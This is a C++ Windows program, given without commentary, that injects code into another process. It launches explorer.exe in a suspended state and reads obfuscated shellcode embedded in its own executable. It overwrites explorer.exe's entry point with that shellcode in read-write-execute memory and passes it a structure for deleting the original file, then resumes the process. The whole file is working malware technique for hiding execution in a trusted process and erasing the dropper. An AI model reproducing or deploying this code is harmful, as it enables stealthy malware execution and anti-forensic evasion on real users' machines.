#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <iostream>
#include "ntundoc.h"

using namespace std;

// Forego byte alignment
#pragma pack(push, 1)

struct coff_header {
    unsigned short machine;
    unsigned short sections;
    unsigned int timestamp;
    unsigned int symboltable;
    unsigned int symbols;
    unsigned short size_of_opt_header;
    unsigned short characteristics;
};

struct optional_header {
    unsigned short magic;
    char linker_version_major;
    char linker_version_minor;
    unsigned int code_size;
    unsigned int idata_size;
    unsigned int udata_size;
    unsigned int entry_point;
    unsigned int code_base;
};

typedef struct _SELFDEL {
  HANDLE  hParent;                // parent process handle
  void*   fnWaitForSingleObject;
  void*   fnCloseHandle;
  void*   fnDeleteFile;
  void*   fnSleep;
  void*   fnExitProcess;
  void*   fnRemoveDirectory;
  void*   fnGetLastError;
  void*   fnLoadLibrary;
  void*   fnGetProcAddress;
  BOOL    fRemDir;
  TCHAR   szFileName[MAX_PATH];   // file to delete
} SELFDEL;

#pragma pack(pop)

// Function courtesy of Rajasekharan Vengalil at Nerdworks Blogorama
DWORD GetProcessEntryPointAddress( HANDLE hProcess, HANDLE hThread ) {
    CONTEXT             context;
    LDT_ENTRY           entry;
    TEB                 teb;
    PEB                 peb;
    DWORD               read;
    DWORD               dwFSBase;
    DWORD               dwImageBase, dwOffset;
    DWORD               dwOptHeaderOffset;
    optional_header     opt;

    //
    // get the current thread context
    //
    context.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS;
    GetThreadContext( hThread, &context );

    //
    // use the segment register value to get a pointer to
    // the TEB
    //
    GetThreadSelectorEntry( hThread, context.SegFs, &entry );
    dwFSBase = ( entry.HighWord.Bits.BaseHi << 24 ) |
                     ( entry.HighWord.Bits.BaseMid << 16 ) |
                     ( entry.BaseLow );

    //
    // read the teb
    //
    ReadProcessMemory( hProcess, (LPCVOID)dwFSBase,
                       &teb, sizeof( TEB ), &read );

    //
    // read the peb from the location pointed at by the teb
    //
    ReadProcessMemory( hProcess, (LPCVOID)teb.Peb,
                       &peb, sizeof( PEB ), &read );

    //
    // figure out where the entry point is located;
    //
    dwImageBase = (DWORD)peb.ImageBaseAddress;
    ReadProcessMemory( hProcess, (LPCVOID)( dwImageBase + 0x3c ),
                       &dwOffset, sizeof( DWORD ), &read );

    dwOptHeaderOffset = ( dwImageBase + dwOffset + 4 +
                            sizeof( coff_header ) );
    ReadProcessMemory( hProcess, (LPCVOID)dwOptHeaderOffset,
                       &opt, sizeof( optional_header ), &read );

    return ( dwImageBase + opt.entry_point );
}



int main(int argc, char *argv[]) {
  STARTUPINFO             si = { sizeof(si) };
  PROCESS_INFORMATION     pi;
  SELFDEL                 selfdel;
  DWORD                   data, oldProt, process_entry, shell_entry, ret;
  TCHAR                   szExe[MAX_PATH] = _T( "explorer.exe" );

  selfdel.fnWaitForSingleObject     = (void*)WaitForSingleObject;
  selfdel.fnCloseHandle             = (void*)CloseHandle;
  selfdel.fnDeleteFile              = (void*)DeleteFile;
  selfdel.fnSleep                   = (void*)Sleep;
  selfdel.fnExitProcess             = (void*)ExitProcess;
  selfdel.fnRemoveDirectory         = (void*)RemoveDirectory;
  selfdel.fnGetLastError            = (void*)GetLastError;
  selfdel.fnLoadLibrary             = (void*)LoadLibrary;
  selfdel.fnGetProcAddress          = (void*)GetProcAddress;

  // Open explorer.exe in suspended state
  if(CreateProcess(0, szExe, 0, 0, 0, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS, 0, 0, &si, &pi)) {
    // Duplicate current process handle to pass to explorer.exe
    DuplicateHandle(GetCurrentProcess(), GetCurrentProcess(), 
		    pi.hProcess, &selfdel.hParent, 0, FALSE, 0);
    
    // Get file path of current process
    GetModuleFileName(0, selfdel.szFileName, MAX_PATH);
    
    // Open current file for reading
    HANDLE file = CreateFile( selfdel.szFileName, FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if(file != NULL) {
      
      // Advance pointer to shellcode location
      ret = SetFilePointer(file, 0x80, NULL, 0);
      if(ret > 0) {
	
	// Allocate memory, shellcode is 149 bytes
	BYTE* shell = (BYTE*) malloc(149);
      
	// Read shellcode into memory
	if(ReadFile(file, shell, 149, &ret, NULL)) {
	  
	  // Get entry point of explorer.exe
	  process_entry = GetProcessEntryPointAddress( pi.hProcess, pi.hThread );

	  // Calculate entry point of "encrypted" shellcode, 10 byte offset
	  shell_entry = process_entry + 10;

	  // Calculate location of selfdelete struct
	  data = process_entry + 149;

	  // Overwrite shellcode entry point in shellcode
	  shell[4] = (BYTE)(shell_entry >> 24);
	  shell[3] = (BYTE)((shell_entry >> 16) & 0xFF);
	  shell[2] = (BYTE)((shell_entry >> 8) & 0xFF);
	  shell[1] = (BYTE)(shell_entry & 0xFF);

	  // Overwrite selfdelete struct location in shellcode
	  shell[22] = (BYTE)((data >> 24) ^ 0x6C);
	  shell[21] = (BYTE)(((data >> 16) & 0xFF) ^ 0x6D);
	  shell[20] = (BYTE)(((data >> 8) & 0xFF) ^ 0x6E);
	  shell[19] = (BYTE)((data & 0xFF) ^ 0x6F);

	  // Set injection location to rwx
	  VirtualProtectEx( pi.hProcess,
			    (PVOID)process_entry,
			    sizeof( selfdel ) + 149,
			    PAGE_EXECUTE_READWRITE,
			    &oldProt );

	  // Write shellcode
	  WriteProcessMemory( pi.hProcess,
			      (PVOID)process_entry,
			      shell,
			      149, 0);

	  // Write selfdelete struct
	  WriteProcessMemory( pi.hProcess,
			      (PVOID)data,
			      &selfdel,
			      sizeof( selfdel ), 0);
	}

	// free memory
	free(shell);
      }
      
      // Close current file
      CloseHandle(file);
    }

    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
  }
}
